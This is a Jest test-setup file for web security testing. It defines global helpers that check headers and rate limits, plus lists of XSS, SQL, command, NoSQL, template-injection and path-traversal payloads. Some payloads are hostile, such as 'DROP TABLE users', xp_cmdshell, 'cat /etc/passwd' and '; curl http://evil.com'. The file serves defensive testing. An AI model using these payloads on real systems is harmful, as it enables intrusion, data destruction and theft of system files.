// Security-specific test setup
// This file runs before security tests

const fs = require('fs');
const path = require('path');

// Security test configuration
const securityConfig = {
  maxResponseTime: 5000,
  maxMemoryUsage: 500 * 1024 * 1024, // 500MB
  securityScanResults: new Map(),
  vulnerabilityThresholds: {
    critical: 0,
    high: 5,
    medium: 20
  }
};

// Load security policies if available
try {
  const securityPolicyPath = path.join(__dirname, '..', '.github', 'security-config.yml');
  if (fs.existsSync(securityPolicyPath)) {
    // In a real implementation, you'd parse YAML here
    console.log('✅ Security policy configuration loaded');
  }
} catch (error) {
  console.warn('⚠️ Could not load security policy configuration');
}

// Security test utilities
global.securityTestUtils = {
  // XSS test payloads
  xssPayloads: [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '"><script>alert(1)</script>',
    '\'"--></title></style></textarea></script><script>alert(1)</script>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<link rel=import href="javascript:alert(1)">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
  ],

  // SQL injection payloads
  sqlInjectionPayloads: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "1' OR '1'='1' --",
    "admin'--",
    "admin'/*",
    "1' OR 1=1#",
    "'; EXEC xp_cmdshell('dir'); --"
  ],

  // Command injection payloads
  commandInjectionPayloads: [
    "; ls -la",
    "| cat /etc/passwd",
    "`whoami`",
    "$(whoami)",
    "; curl http://evil.com",
    "& dir",
    "&& cat /etc/hosts",
    "|| whoami"
  ],

  // Path traversal payloads
  pathTraversalPayloads: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "/etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  ],

  // Template injection payloads
  templateInjectionPayloads: [
    "${7*7}",
    "{{7*7}}",
    "#{7*7}",
    "<%= 7*7 %>",
    "${{7*7}}",
    "#{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}"
  ],

  // NoSQL injection payloads
  nosqlInjectionPayloads: [
    "{'$ne': null}",
    "{'$gt': ''}",
    "{'$where': 'this.username == this.password'}",
    "{'$regex': '.*'}",
    "{'$or': [{'username': 'admin'}, {'username': 'administrator'}]}"
  ],

  // Security header validation
  validateSecurityHeaders: (headers, strict = false) => {
    const results = {
      valid: true,
      missing: [],
      weak: [],
      recommendations: []
    };

    // Essential security headers
    const essentialHeaders = {
      'x-frame-options': (value) => ['DENY', 'SAMEORIGIN'].includes(value),
      'x-content-type-options': (value) => value === 'nosniff',
      'x-xss-protection': (value) => ['0', '1; mode=block'].includes(value)
    };

    // Recommended security headers
    const recommendedHeaders = {
      'strict-transport-security': (value) => value && value.includes('max-age='),
      'content-security-policy': (value) => value && value.length > 10,
      'referrer-policy': (value) => ['no-referrer', 'strict-origin-when-cross-origin', 'same-origin'].includes(value),
      'permissions-policy': (value) => value && value.length > 0
    };

    // Check essential headers
    for (const [header, validator] of Object.entries(essentialHeaders)) {
      const value = headers[header];
      if (!value) {
        results.missing.push(header);
        results.valid = false;
      } else if (!validator(value)) {
        results.weak.push({ header, value, expected: 'proper security value' });
        if (strict) results.valid = false;
      }
    }

    // Check recommended headers
    for (const [header, validator] of Object.entries(recommendedHeaders)) {
      const value = headers[header];
      if (!value) {
        results.recommendations.push(`Add ${header} header`);
      } else if (!validator(value)) {
        results.recommendations.push(`Improve ${header} header value`);
      }
    }

    return results;
  },

  // Rate limiting test helper
  testRateLimit: async (requestFn, limit = 10, windowMs = 60000) => {
    const startTime = Date.now();
    const requests = [];
    const results = {
      totalRequests: limit + 5, // Test beyond the limit
      successCount: 0,
      rateLimitedCount: 0,
      errors: [],
      averageResponseTime: 0
    };

    // Make requests rapidly
    for (let i = 0; i < results.totalRequests; i++) {
      try {
        const response = await requestFn();
        requests.push({
          status: response.status,
          time: Date.now() - startTime,
          headers: response.headers
        });

        if (response.status === 200) {
          results.successCount++;
        } else if (response.status === 429) {
          results.rateLimitedCount++;
        }
      } catch (error) {
        results.errors.push(error.message);
      }

      // Small delay between requests
      await new Promise(resolve => setTimeout(resolve, 10));
    }

    // Calculate average response time
    const totalTime = requests.reduce((sum, req) => sum + req.time, 0);
    results.averageResponseTime = totalTime / requests.length;

    return results;
  },

  // Memory usage monitor
  monitorMemoryUsage: () => {
    const usage = process.memoryUsage();
    return {
      rss: usage.rss, // Resident Set Size
      heapTotal: usage.heapTotal,
      heapUsed: usage.heapUsed,
      external: usage.external,
      arrayBuffers: usage.arrayBuffers
    };
  },

  // Performance degradation detector
  detectPerformanceDegradation: (baseline, current, threshold = 0.2) => {
    const degradation = (current - baseline) / baseline;
    return {
      degraded: degradation > threshold,
      degradationPercent: degradation * 100,
      threshold: threshold * 100
    };
  },

  // Security event logger (for testing)
  logSecurityEvent: (event, level = 'info', details = {}) => {
    const timestamp = new Date().toISOString();
    const logEntry = {
      timestamp,
      event,
      level,
      details,
      testRun: true
    };

    securityConfig.securityScanResults.set(event, logEntry);

    if (process.env.VERBOSE_SECURITY_TESTS) {
      console.log(`🛡️ [${level.toUpperCase()}] ${event}:`, details);
    }
  },

  // Generate security test report
  generateSecurityReport: () => {
    const report = {
      timestamp: new Date().toISOString(),
      testRun: 'security-validation',
      events: Array.from(securityConfig.securityScanResults.values()),
      summary: {
        totalEvents: securityConfig.securityScanResults.size,
        criticalEvents: 0,
        warningEvents: 0,
        infoEvents: 0
      }
    };

    // Count events by level
    report.events.forEach(event => {
      switch (event.level) {
        case 'critical':
          report.summary.criticalEvents++;
          break;
        case 'warning':
          report.summary.warningEvents++;
          break;
        case 'info':
          report.summary.infoEvents++;
          break;
      }
    });

    return report;
  }
};

// Set up security test environment
beforeAll(() => {
  console.log('🛡️ Setting up security test environment...');

  // Clear any previous security scan results
  securityConfig.securityScanResults.clear();

  // Set security-specific environment variables
  process.env.SECURITY_TESTING = 'true';
  process.env.NODE_ENV = 'test';

  // Monitor initial memory usage
  const initialMemory = global.securityTestUtils.monitorMemoryUsage();
  global.securityBaseline = {
    memory: initialMemory,
    startTime: Date.now()
  };
});

// Clean up after security tests
afterAll(() => {
  console.log('🛡️ Cleaning up security test environment...');

  // Generate final security report
  const securityReport = global.securityTestUtils.generateSecurityReport();

  if (process.env.VERBOSE_SECURITY_TESTS) {
    console.log('🛡️ Security Test Summary:');
    console.log(`  Total Events: ${securityReport.summary.totalEvents}`);
    console.log(`  Critical: ${securityReport.summary.criticalEvents}`);
    console.log(`  Warnings: ${securityReport.summary.warningEvents}`);
    console.log(`  Info: ${securityReport.summary.infoEvents}`);
  }

  // Save security report
  try {
    const fs = require('fs');
    const reportPath = path.join(__dirname, '..', 'coverage', 'security-test-report.json');
    fs.mkdirSync(path.dirname(reportPath), { recursive: true });
    fs.writeFileSync(reportPath, JSON.stringify(securityReport, null, 2));
    console.log(`✅ Security test report saved to ${reportPath}`);
  } catch (error) {
    console.warn('⚠️ Could not save security test report:', error.message);
  }
});

// Export configuration for tests
global.securityConfig = securityConfig;

module.exports = global.securityTestUtils;